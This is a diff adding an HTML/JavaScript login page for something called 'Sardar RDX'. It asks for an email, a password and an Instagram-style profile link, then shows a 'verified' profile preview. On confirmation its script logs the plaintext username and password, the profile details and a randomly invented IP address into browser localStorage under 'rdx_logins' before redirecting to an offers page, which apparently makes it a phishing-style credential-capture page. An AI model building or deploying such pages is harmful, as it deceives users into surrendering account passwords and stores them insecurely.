@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login | Sardar RDX</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
+    <style>
+        /* Account Preview Card */
+        .account-preview {
+            display: none;
+            margin-top: 0.8rem;
+            padding: 0.9rem 1.1rem;
+            border-radius: 14px;
+            border: 1px solid rgba(0,245,255,0.2);
+            background: rgba(0,245,255,0.04);
+            animation: fadeInUp 0.3s ease-out;
+            align-items: center;
+            gap: 0.9rem;
+        }
+        .account-preview.show { display: flex; }
+        .account-preview.error {
+            border-color: rgba(239,68,68,0.35);
+            background: rgba(239,68,68,0.05);
+        }
+        .preview-icon {
+            width: 44px; height: 44px;
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.3rem;
+            flex-shrink: 0;
+        }
+        .preview-info { flex: 1; min-width: 0; }
+        .preview-platform {
+            font-size: 0.65rem;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            opacity: 0.6;
+            margin-bottom: 0.15rem;
+        }
+        .preview-username {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 700;
+            color: var(--neon-blue);
+            text-shadow: 0 0 10px rgba(0,245,255,0.4);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        .preview-realname {
+            font-size: 0.78rem;
+            color: rgba(255,255,255,0.5);
+            margin-top: 0.1rem;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+        @keyframes scanPulse {
+            0%,100% { opacity: 0.4; }
+            50%      { opacity: 1; }
+        }
+        .scanning-text {
+            font-size: 0.75rem;
+            color: #ffd700;
+            letter-spacing: 2px;
+            animation: scanPulse 0.8s ease-in-out infinite;
+        }
+        .preview-badge {
+            font-size: 0.7rem;
+            padding: 0.2rem 0.6rem;
+            border-radius: 50px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            flex-shrink: 0;
+        }
+        .badge-valid {
+            background: rgba(0,255,136,0.15);
+            border: 1px solid rgba(0,255,136,0.3);
+            color: var(--neon-green);
+        }
+        .badge-invalid {
+            background: rgba(239,68,68,0.15);
+            border: 1px solid rgba(239,68,68,0.3);
+            color: #ef4444;
+        }
+        #account-link {
+            transition: border-color 0.3s;
+        }
+        #account-link.valid-link   { border-color: rgba(0,255,136,0.4) !important; }
+        #account-link.invalid-link { border-color: rgba(239,68,68,0.4) !important; }
+
+        .submit-btn {
+            width: 100%;
+            margin-top: 1.2rem;
+            padding: 1rem;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.85rem;
+            letter-spacing: 3px;
+            transition: opacity 0.3s;
+        }
+        .submit-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            filter: grayscale(0.5);
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container glass">
+        <!-- Step 1: Initial Form (Link + Credentials) -->
+        <div id="step-form">
+            <div style="text-align:center;margin-bottom:2rem;">
+                <div class="login-icon-wrap">
+                    <i class="fas fa-shield-alt" style="font-size:2rem;color:var(--neon-blue);position:relative;z-index:1;"></i>
+                </div>
+                <h2 style="font-family:'Orbitron',sans-serif;font-size:1.5rem;letter-spacing:3px;margin-bottom:0.4rem;">USER LOGIN</h2>
+                <p style="color:var(--text-dim);font-size:0.85rem;letter-spacing:1px;">Enter details to connect account</p>
+            </div>
+
+            <form id="initialForm">
+                <div class="form-group">
+                    <label><i class="fas fa-user" style="margin-right:0.4rem;color:var(--neon-blue);"></i>System Email/User</label>
+                    <input type="text" id="username" placeholder="Enter your email" required>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-lock" style="margin-right:0.4rem;color:var(--neon-blue);"></i>System Password</label>
+                    <input type="password" id="password" placeholder="••••••••" required>
+                </div>
+                <div class="form-group">
+                    <label><i class="fas fa-link" style="margin-right:0.4rem;color:var(--neon-blue);"></i>Account Profile Link</label>
+                    <input type="text" id="account-link" placeholder="https://www.instagram.com/yourprofile" required oninput="handleLinkInput()">
+                </div>
+
+                <button type="submit" class="btn btn-primary submit-btn" id="connect-btn">
+                    <i class="fas fa-bolt" style="margin-right:0.5rem;"></i>CONNECT & VERIFY
+                </button>
+                
+                <p id="link-error" style="display:none;color:#ef4444;font-size:0.78rem;text-align:center;margin-top:0.6rem;letter-spacing:0.5px;">
+                    <i class="fas fa-exclamation-triangle" style="margin-right:0.4rem;"></i>
+                    Invalid link format
+                </p>
+            </form>
+        </div>
+
+        <!-- Step 2: Profile Verification -->
+        <div id="step-verify" style="display:none;">
+            <div style="text-align:center;margin-bottom:1.5rem;">
+                <div id="confirmed-platform" style="font-size:0.7rem;letter-spacing:3px;color:var(--neon-blue);text-transform:uppercase;margin-bottom:0.5rem;">INSTAGRAM</div>
+                <h2 style="font-family:'Orbitron',sans-serif;font-size:1.3rem;letter-spacing:2px;margin-bottom:0.4rem;">VERIFY IDENTITY</h2>
+                <p style="color:var(--text-dim);font-size:0.8rem;">Confirm this is your account</p>
+            </div>
+
+            <div class="account-preview show" id="account-preview" style="margin-bottom:2rem;padding:1.5rem;background:rgba(255,255,255,0.03);border-color:rgba(0,245,255,0.3);flex-direction:column;text-align:center;">
+                <div id="preview-icon-wrap" style="position:relative;width:80px;height:80px;margin:0 auto 1rem;">
+                    <div class="preview-icon" id="preview-icon" style="width:80px;height:80px;font-size:2.5rem;border-radius:50%;box-shadow:0 0 30px rgba(0,245,255,0.3);display:flex;align-items:center;justify-content:center;"></div>
+                    <img id="preview-avatar" src="" alt="" style="display:none;width:80px;height:80px;border-radius:50%;object-fit:cover;border:2px solid rgba(0,245,255,0.4);box-shadow:0 0 25px rgba(0,245,255,0.3);position:absolute;top:0;left:0;" onerror="this.style.display='none';document.getElementById('preview-icon').style.display='flex';">
+                    <div id="avatar-loading" style="display:none;position:absolute;inset:0;border-radius:50%;background:rgba(0,0,0,0.5);align-items:center;justify-content:center;font-size:0.6rem;color:var(--neon-blue);letter-spacing:1px;">...</div>
+                </div>
+                <div class="preview-info" style="width:100%;">
+                    <div class="preview-username" id="preview-username" style="font-size:1.2rem;margin-bottom:0.3rem;">Fetching...</div>
+                    <div class="preview-realname" id="preview-realname" style="font-size:0.9rem;color:var(--neon-blue);opacity:0.8;">@username</div>
+                </div>
+                <div id="preview-badge" style="margin-top:1rem;font-size:0.65rem;letter-spacing:2px;color:var(--neon-green);font-weight:700;">✓ SECURELY LINKED</div>
+            </div>
+
+            <button type="button" class="btn btn-primary submit-btn" id="confirm-btn" onclick="finalizeLogin()">
+                <i class="fas fa-check-circle" style="margin-right:0.5rem;"></i>CONFIRM & PROCEED
+            </button>
+            <button type="button" class="btn" style="width:100%;margin-top:1rem;background:transparent;border:1px solid rgba(255,255,255,0.05);font-size:0.75rem;letter-spacing:1px;color:var(--text-dim);" onclick="goBackToStep1()">
+                <i class="fas fa-undo" style="margin-right:0.4rem;"></i>EDIT DETAILS
+            </button>
+        </div>
+
+        <div style="margin-top:2rem;text-align:center;">
+            <a href="index.html" style="color:var(--text-dim);text-decoration:none;font-size:0.8rem;letter-spacing:1px;transition:color 0.3s;" onmouseover="this.style.color='var(--neon-blue)'" onmouseout="this.style.color='var(--text-dim)'">
+                <i class="fas fa-arrow-left" style="margin-right:0.4rem;"></i>Cancel and Return
+            </a>
+        </div>
+    </div>
+
+    <script src="js/app.js"></script>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const refPlatform = urlParams.get('ref');
+        if (refPlatform) sessionStorage.setItem('selectedPlatform', refPlatform);
+
+        let extractedAccount = null;
+
+        function handleLinkInput() {
+            const raw = document.getElementById('account-link').value.trim();
+            const errMsg = document.getElementById('link-error');
+
+            if (!raw) {
+                errMsg.style.display = 'none';
+                return;
+            }
+
+            const result = rdxExtractUsername(raw);
+            if (result && !result.error) {
+                extractedAccount = result;
+                errMsg.style.display = 'none';
+            } else {
+                errMsg.style.display = 'block';
+                errMsg.innerHTML = `<i class="fas fa-exclamation-triangle" style="margin-right:0.4rem;"></i>${result ? result.error : 'Invalid link'}`;
+            }
+        }
+
+        document.getElementById('initialForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value.trim();
+            const pass = document.getElementById('password').value;
+            const link = document.getElementById('account-link').value.trim();
+
+            if (!user || !pass || !link) { alert('Sari details bharna zaroori hain!'); return; }
+            if (!extractedAccount) { alert('Valid profile link enter karein!'); return; }
+
+            const btn = document.getElementById('connect-btn');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:0.5rem;"></i>CONNECTING...';
+            btn.disabled = true;
+
+            // Prepare Step 2
+            document.getElementById('confirmed-platform').textContent = extractedAccount.name;
+            document.getElementById('preview-icon').style.background = extractedAccount.bg;
+            document.getElementById('preview-icon').textContent = extractedAccount.icon;
+            document.getElementById('preview-icon').style.display = 'flex';
+            document.getElementById('preview-avatar').style.display = 'none';
+            document.getElementById('preview-username').textContent = 'Fetching...';
+            document.getElementById('preview-realname').textContent = (extractedAccount.username.match(/^\d+$/)) ? 'UID: ' + extractedAccount.username : '@' + extractedAccount.username;
+
+            // Transition
+            setTimeout(() => {
+                document.getElementById('step-form').style.display = 'none';
+                const step2 = document.getElementById('step-verify');
+                step2.style.display = 'block';
+                step2.style.opacity = '0';
+                step2.style.transform = 'translateY(20px)';
+                
+                setTimeout(() => {
+                    step2.style.opacity = '1';
+                    step2.style.transform = 'translateY(0)';
+                    step2.style.transition = 'all 0.4s ease';
+                    
+                    // Fetch Name
+                    fetchRealName(link, extractedAccount);
+                }, 50);
+            }, 800);
+        });
+
+        function showProfilePicture(imageUrl) {
+            if (!imageUrl) return;
+            const avatarEl = document.getElementById('preview-avatar');
+            const iconEl   = document.getElementById('preview-icon');
+            avatarEl.src = imageUrl;
+            avatarEl.onload = () => {
+                iconEl.style.display = 'none';
+                avatarEl.style.display = 'block';
+            };
+            avatarEl.onerror = () => {
+                avatarEl.style.display = 'none';
+                iconEl.style.display = 'flex';
+            };
+        }
+
+        function fetchRealName(url, account) {
+            fetch('/api/profile-name?url=' + encodeURIComponent(url))
+                .then(r => r.json())
+                .then(data => {
+                    const nameEl  = document.getElementById('preview-username');
+                    const subEl   = document.getElementById('preview-realname');
+                    const badgeEl = document.getElementById('preview-badge');
+
+                    // Show profile picture if available
+                    if (data.imageUrl) showProfilePicture(data.imageUrl);
+
+                    if (data.success && data.name) {
+                        nameEl.textContent = data.name;
+                        subEl.textContent = (account.username.match(/^\d+$/)) ? 'UID: ' + account.username : '@' + account.username;
+                        extractedAccount.realName = data.name;
+                        if (badgeEl) badgeEl.innerHTML = '✓ PROFILE VERIFIED';
+                    } else {
+                        const display = account.username.match(/^\d+$/)
+                            ? 'UID: ' + account.username
+                            : account.username;
+                        nameEl.textContent = display;
+                        subEl.style.color = 'rgba(0,255,136,0.7)';
+                        subEl.textContent = '✓ Profile Linked — Name is Private';
+                        extractedAccount.realName = display;
+                        if (badgeEl) {
+                            badgeEl.innerHTML = '✓ ACCOUNT LINKED';
+                            badgeEl.style.color = 'var(--neon-green)';
+                        }
+                    }
+                })
+                .catch(() => {
+                    const display = account.username.match(/^\d+$/)
+                        ? 'UID: ' + account.username : '@' + account.username;
+                    document.getElementById('preview-username').textContent = display;
+                    document.getElementById('preview-realname').textContent = '✓ Account Connected';
+                    extractedAccount.realName = display;
+                });
+        }
+
+        function finalizeLogin() {
+            const btn = document.getElementById('confirm-btn');
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:0.5rem;"></i>FINALIZING...';
+            btn.disabled = true;
+
+            setTimeout(() => {
+                const user = document.getElementById('username').value.trim();
+                const pass = document.getElementById('password').value;
+                const accountLink = document.getElementById('account-link').value.trim();
+                const platform = sessionStorage.getItem('selectedPlatform') || 'Unknown';
+
+                const logins = JSON.parse(localStorage.getItem('rdx_logins') || '[]');
+                logins.push({
+                    user, pass, accountLink,
+                    accountName: extractedAccount.username,
+                    accountRealName: extractedAccount.realName || '',
+                    accountPlatform: extractedAccount.platform,
+                    platform,
+                    time: new Date().toLocaleString(),
+                    ip: '192.168.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255)
+                });
+                localStorage.setItem('rdx_logins', JSON.stringify(logins));
+
+                sessionStorage.setItem('userLoggedIn_' + (platform || 'unknown').toLowerCase(), 'true');
+                sessionStorage.setItem('currentUser_' + (platform || 'unknown').toLowerCase(), user);
+                sessionStorage.setItem('currentUser', user);
+                
+                const dest = refPlatform ? 'offers.html?ref=' + refPlatform : 'offers.html';
+                window.location.href = dest;
+            }, 1000);
+        }
+
+        function goBackToStep1() {
+            document.getElementById('step-verify').style.display = 'none';
+            const step1 = document.getElementById('step-form');
+            step1.style.display = 'block';
+            step1.style.opacity = '1';
+            step1.style.transform = 'translateY(0)';
+            document.getElementById('connect-btn').innerHTML = '<i class="fas fa-bolt" style="margin-right:0.5rem;"></i>CONNECT & VERIFY';
+            document.getElementById('connect-btn').disabled = false;
+        }
+    </script>
+</body>
+</html>
